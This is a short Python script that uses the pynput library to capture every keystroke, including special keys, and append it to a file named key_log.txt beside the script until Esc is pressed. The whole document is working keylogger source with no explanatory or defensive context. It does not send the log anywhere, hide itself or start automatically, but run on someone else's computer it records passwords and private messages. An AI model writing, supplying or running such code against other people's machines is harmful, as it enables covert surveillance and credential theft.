from pynput import keyboard
import os

log_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "key_log.txt")

def on_press(key):
    try:
        with open(log_file, "a", encoding="utf-8") as f: 
            f.write(f"{key.char}") 
    
    except AttributeError:
        with open(log_file, "a", encoding="utf-8") as f:
            f.write(f"[{key}]")
            
def on_release(key):
    if key == keyboard.Key.esc:
        return False  
    
# Start the listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()